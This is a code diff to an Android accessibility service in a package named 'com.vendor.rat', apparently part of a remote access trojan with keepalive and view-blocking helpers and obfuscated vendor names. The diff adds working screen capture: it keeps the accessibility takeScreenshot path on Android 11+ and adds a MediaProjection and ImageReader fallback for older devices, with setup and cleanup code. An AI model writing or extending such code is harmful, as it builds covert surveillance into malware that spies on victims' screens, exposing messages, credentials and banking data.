@@ -4,9 +4,21 @@ import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.content.Context;
 import android.content.Intent;
+import android.graphics.Bitmap;
+import android.graphics.PixelFormat;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
 import android.os.Build;
+import android.os.Handler;
+import android.os.HandlerThread;
 import android.provider.Settings;
+import android.util.DisplayMetrics;
 import android.util.Log;
+import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 import android.view.accessibility.AccessibilityWindowInfo;
@@ -19,6 +31,7 @@ import com.vendor.rat.helper.BlockViewHelper;
 import com.vendor.rat.keepalive.thread.StrategyThread;
 
 import java.io.File;
+import java.nio.ByteBuffer;
 import java.util.List;
 import java.util.Objects;
 import java.util.concurrent.Executors;
@@ -48,6 +61,13 @@ import java.util.concurrent.locks.ReentrantLock;
 public class MyAccessibilityService extends AccessibilityService {
 
     private static final String TAG = "MyAccessibilityService";
+
+    // ====== MediaProjection 截屏降级 (API < 30) ======
+    private MediaProjection mediaProjection;
+    private ImageReader imageReader;
+    private VirtualDisplay virtualDisplay;
+    private HandlerThread mediaProjectionThread;
+    private Handler mediaProjectionHandler;
 
     // ====== vendor: f219p — 服务实例引用 ======
     public static final AtomicReference<MyAccessibilityService> f219p = new AtomicReference<>(null);
@@ -389,6 +409,7 @@ public class MyAccessibilityService extends AccessibilityService {
         } catch (Exception e) {
             Log.e(TAG, "onDestroy error", e);
         }
+        cleanupMediaProjection();
         super.onDestroy();
     }
 
@@ -883,26 +904,33 @@ public class MyAccessibilityService extends AccessibilityService {
         context.startActivity(intent);
     }
 
-    // ============ 截屏能力 (API 30+) ============
+    // ============ 截屏能力 (API 30+ / MediaProjection 降级) ============
 
     /**
      * 异步截屏回调接口
      */
     public interface ScreenshotCallback {
-        void onScreenshot(android.graphics.Bitmap bitmap);
+        void onScreenshot(Bitmap bitmap);
         void onError(String error);
     }
 
     /**
-     * 通过 AccessibilityService.takeScreenshot() 异步截屏
-     * 需要 API 30+ (Android 11+)，设备 Android 12 满足
+     * 异步截屏 — 自动选择最佳方式:
+     *   API 30+ → AccessibilityService.takeScreenshot()
+     *   API < 30 → MediaProjection + ImageReader
      */
     public void takeScreenshotAsync(final ScreenshotCallback callback) {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
-            callback.onError("takeScreenshot requires API 30+");
-            return;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            takeScreenshotViaAccessibility(callback);
+        } else {
+            takeScreenshotViaMediaProjection(callback);
         }
+    }
 
+    /**
+     * API 30+ 截屏 — 通过 AccessibilityService.takeScreenshot()
+     */
+    private void takeScreenshotViaAccessibility(final ScreenshotCallback callback) {
         try {
             takeScreenshot(
                 android.view.Display.DEFAULT_DISPLAY,
@@ -912,14 +940,12 @@ public class MyAccessibilityService extends AccessibilityService {
                     public void onSuccess(ScreenshotResult result) {
                         try {
                             android.hardware.HardwareBuffer hwBuffer = result.getHardwareBuffer();
-                            android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(
+                            Bitmap bitmap = Bitmap.wrapHardwareBuffer(
                                 hwBuffer, result.getColorSpace());
                             hwBuffer.close();
 
                             if (bitmap != null) {
-                                // HardwareBuffer bitmap 不能直接 compress，需要 copy 到 software bitmap
-                                android.graphics.Bitmap swBitmap = bitmap.copy(
-                                    android.graphics.Bitmap.Config.ARGB_8888, false);
+                                Bitmap swBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                                 bitmap.recycle();
                                 callback.onScreenshot(swBitmap);
                             } else {
@@ -940,6 +966,130 @@ public class MyAccessibilityService extends AccessibilityService {
         } catch (Exception e) {
             Log.e(TAG, "takeScreenshot call failed", e);
             callback.onError(e.getMessage());
+        }
+    }
+
+    /**
+     * API < 30 截屏 — 通过 MediaProjection + ImageReader
+     */
+    private void takeScreenshotViaMediaProjection(final ScreenshotCallback callback) {
+        if (mediaProjection == null) {
+            callback.onError("MediaProjection not initialized (API " + Build.VERSION.SDK_INT + ")");
+            return;
+        }
+
+        try {
+            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+            DisplayMetrics metrics = new DisplayMetrics();
+            wm.getDefaultDisplay().getMetrics(metrics);
+
+            int width = metrics.widthPixels;
+            int height = metrics.heightPixels;
+            int density = metrics.densityDpi;
+
+            // 创建一次性 ImageReader
+            final ImageReader reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+            final VirtualDisplay vd = mediaProjection.createVirtualDisplay(
+                "screenshot",
+                width, height, density,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                reader.getSurface(),
+                null, mediaProjectionHandler
+            );
+
+            reader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
+                @Override
+                public void onImageAvailable(ImageReader r) {
+                    Image image = null;
+                    try {
+                        image = r.acquireLatestImage();
+                        if (image == null) {
+                            callback.onError("MediaProjection: acquired image is null");
+                            return;
+                        }
+
+                        Image.Plane[] planes = image.getPlanes();
+                        ByteBuffer buffer = planes[0].getBuffer();
+                        int pixelStride = planes[0].getPixelStride();
+                        int rowStride = planes[0].getRowStride();
+                        int rowPadding = rowStride - pixelStride * width;
+
+                        Bitmap bitmap = Bitmap.createBitmap(
+                            width + rowPadding / pixelStride, height,
+                            Bitmap.Config.ARGB_8888);
+                        bitmap.copyPixelsFromBuffer(buffer);
+
+                        // 裁掉 padding
+                        if (rowPadding > 0) {
+                            Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height);
+                            bitmap.recycle();
+                            bitmap = cropped;
+                        }
+
+                        callback.onScreenshot(bitmap);
+                    } catch (Exception e) {
+                        Log.e(TAG, "MediaProjection screenshot error", e);
+                        callback.onError(e.getMessage());
+                    } finally {
+                        if (image != null) image.close();
+                        reader.close();
+                        vd.release();
+                    }
+                }
+            }, mediaProjectionHandler);
+
+        } catch (Exception e) {
+            Log.e(TAG, "MediaProjection capture failed", e);
+            callback.onError(e.getMessage());
+        }
+    }
+
+    /**
+     * 初始化 MediaProjection — 从 Activity 授权结果调用
+     */
+    public void initMediaProjection(int resultCode, Intent data) {
+        cleanupMediaProjection();
+
+        MediaProjectionManager mpm = (MediaProjectionManager)
+            getSystemService(MEDIA_PROJECTION_SERVICE);
+        if (mpm == null) {
+            Log.e(TAG, "MediaProjectionManager not available");
+            return;
+        }
+
+        mediaProjection = mpm.getMediaProjection(resultCode, data);
+        if (mediaProjection == null) {
+            Log.e(TAG, "Failed to create MediaProjection");
+            return;
+        }
+
+        mediaProjectionThread = new HandlerThread("MediaProjection");
+        mediaProjectionThread.start();
+        mediaProjectionHandler = new Handler(mediaProjectionThread.getLooper());
+
+        Log.i(TAG, "MediaProjection initialized successfully");
+    }
+
+    /**
+     * 清理 MediaProjection 资源
+     */
+    private void cleanupMediaProjection() {
+        if (virtualDisplay != null) {
+            virtualDisplay.release();
+            virtualDisplay = null;
+        }
+        if (imageReader != null) {
+            imageReader.close();
+            imageReader = null;
+        }
+        if (mediaProjection != null) {
+            mediaProjection.stop();
+            mediaProjection = null;
+        }
+        if (mediaProjectionThread != null) {
+            mediaProjectionThread.quitSafely();
+            mediaProjectionThread = null;
+            mediaProjectionHandler = null;
         }
     }
 }
